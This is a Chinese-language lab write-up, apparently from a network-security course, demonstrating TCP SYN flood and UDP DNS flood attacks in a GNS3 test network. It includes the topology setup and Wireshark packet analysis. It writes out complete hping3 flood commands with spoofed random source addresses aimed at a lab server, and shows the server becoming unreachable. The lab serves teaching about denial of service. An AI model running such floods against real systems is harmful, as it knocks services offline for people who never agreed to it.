# TCP, UDP Flood 攻击



## 原理

![image-20241114201013859](https://s2.loli.net/2024/11/14/KZNc6O3FBzHaYxh.png)



![image-20241114201038779](https://s2.loli.net/2024/11/14/4EGoxBeIuzcHRq7.png)

![image-20241114201204135](https://s2.loli.net/2024/11/14/4AM3ZOqdiswxoLW.png)





## TCP Flood攻击



### 配置环境



#### Windows Server 2016配置

<img src="https://s2.loli.net/2024/11/09/u1rngB2wO4GLXNx.png" alt="image-20241109104636217" style="zoom:33%;" />



服务器管理器，创建一个Web服务器并开启该服务器功能

![image-20241109145742883](https://s2.loli.net/2024/11/09/DHp3vXN4khjt71r.png)





#### kali配置



`vim /etc/network/interfaces`

![image-20241109144821832](https://s2.loli.net/2024/11/09/O8VBpjfd9Uw1SI3.png)

`ifup eth0` 开启网络



查看Kali ip 信息：

<img src="https://s2.loli.net/2024/11/09/VXyJrhcQ23v8Z4R.png" alt="image-20241109105102854"  />



#### 修改路由器信息：



拓扑关系如下所示：

![image-20241109145521425](https://s2.loli.net/2024/11/09/r9kMCXcQJhSyEbA.png)



GNS 3 中修改路由器 R1:

<img src="https://s2.loli.net/2024/11/09/ZIA3C8pMTUqOenm.png" alt="image-20241109132136568"  />

<img src="https://s2.loli.net/2024/11/09/AFNzmCcHywpYk6M.png" alt="image-20241109132412787"  />



![image-20241109132451903](https://s2.loli.net/2024/11/09/H6Uar8eKISBwtCg.png)



**GNS3 中修改Wireshark路径**

![image-20241109133027360](https://s2.loli.net/2024/11/09/9FjdzqMyVuQIfsn.png)



#### 连通性测试：

Windows Server 2016 ping kali: 

![image-20241109144147854](https://s2.loli.net/2024/11/09/tjyPTrWQVgvX5cR.png)



kali ping Windows Server 2016: 

![image-20241109144301958](https://s2.loli.net/2024/11/09/NYPW4o5wBfEpk21.png)



### 攻击



此时kali可以正常访问服务器：

![image-20241109150552373](https://s2.loli.net/2024/11/09/9ydJGBevscb6Fhm.png)



在Kali Linux上使用 `hping3` 攻击Windows 2016 Server

`hping3 -S（表示SYN Flood攻击） -c 包数量 –-flood（表示以最快速度发送包，并且不显示回复） -d 每个包中数据长度 -w 窗口长度 -p 目标端口号 --rand-source（表示以随机的IP地址发送流量）`



在GNS3上服务器网段上打开Wireshark抓包



`hping3 -S -c 100 --flood -d 32 -w 64 -p 80 --rand-source 192.168.2.2`

![image-20241109162645887](https://s2.loli.net/2024/11/09/WJoMVOu9xACyRFg.png)

此时服务器可以正常访问



`hping3 -S -c 500 --flood -d 64 -w 128 -p 80 --rand-source 192.168.2.2`

![image-20241109162713438](https://s2.loli.net/2024/11/09/8gn5rRH7wKDuXld.png)

此时服务器也可以正常访问，但加载时间较长



`hping3 -S -c 1000 --flood -d 128 -w 512 -p 80 --rand-source 192.168.2.2`

![image-20241109162826542](https://s2.loli.net/2024/11/09/D1M4cQrWxHXb5iV.png)



此时服务器无法访问，页面无法加载

![image-20241109151812208](https://s2.loli.net/2024/11/09/45UIAGLuzQBtZD8.png)





## UDP 攻击



### 创建 DNS 服务器域名到 IP 地址的映射



创建了DNS服务器上www.cybersecurity.com到其IP地址的映射关系：

1. 新建区域：

![image-20241109164042178](https://s2.loli.net/2024/11/09/kn3oNyxl5IHA1sz.png)

区域名为 `www.cybersecurity.com`

![image-20241109164121888](https://s2.loli.net/2024/11/09/VqIWhBUXjY6kGAx.png)

新建主机：

![image-20241109164222348](https://s2.loli.net/2024/11/09/HjCBvb6FQ5LdTgi.png)

填写ip地址作为该域名的解析地址：

![image-20241109164301606](https://s2.loli.net/2024/11/09/4bymuXS2dTDIH1z.png)







### **win 10 访问域名**

win10 网络配置如下：

![image-20241109165201330](https://s2.loli.net/2024/11/09/165FkJX8SZerhTj.png)



Win10 正常解析出 www.cybersecurity.com的IP地址：

![image-20241109165351812](https://s2.loli.net/2024/11/09/P7Q3oZRGkNWIUjn.png)





Wireshark抓取该过程的UDP报文：

![image-20241109171320690](https://s2.loli.net/2024/11/09/wa63etH1u8MZiSB.png)



Win10请求Windows Server2016 DNS 解析的UDP报文分析：

![image-20241109171126143](https://s2.loli.net/2024/11/09/gI1aCMfHNvA25bV.png)

UDP 字段包括：源端口号，目的端口号，报文长度，校验和，时间戳，载荷。

数据段包括请求的选项、查询部分(Queries) ,查询部分包括域名(`www.cybersecurity.com`)，域名长度(`Name Length : 21 `)，查询类型 (`Type: AAAA`) 



**Windows Server 2016的响应报文如下：**

![image-20241109171159120](https://s2.loli.net/2024/11/09/cjxKvf4CiM6wBku.png)

响应报文中数据段额外包含 Answers 字段：包括对客户端查询的回答(`addr 192.168.2.3`)、请求到达时间、响应时间





### 攻击

通过Kali Linux的hping3工具用以下指令攻击Windows2016服务器

`hping3 --udp --rand-source -p 53 -d 100 --flood 192.168.2.2`

- `--rand-source` : 表示使用随机源ip地址

  

该过程打开真实机上的Wireshark抓取192.168.2.0/24网段的流量，观察并分析攻击时发送的UDP包的特征： UDP 包的源 IP 地址随机，且UDP 包的格式非法(`Malformed Packet`)

![image-20241109172218589](https://s2.loli.net/2024/11/09/eolNcU5gKxXZEAi.png)



攻击UDP 包的具体内容如下：

![image-20241109173057790](https://s2.loli.net/2024/11/09/78kvZfnQeE6sxwF.png)

攻击UDP包的特征：

1. 基于UDP协议，目标端口是 53（DNS 端口）
2. 源 IP 地址是随机变化的 (`--rand - source`参数)
3.  “Malformed Packet: DNS”（畸形 DNS 数据包）。因为`hping3`发送的数据包可能不符合正常的 DNS 数据包格式，目的是通过发送异常数据包来干扰或攻击目标服务器的 DNS 服务。这种畸形数据包可能会导致目标服务器在处理 DNS 请求时出现错误，消耗系统资源来处理这些异常情况。



此时在Windows10上通过nslookup 无法解析出域名

![image-20241109172142326](https://s2.loli.net/2024/11/09/esKYbSpXnPgRMEo.png)
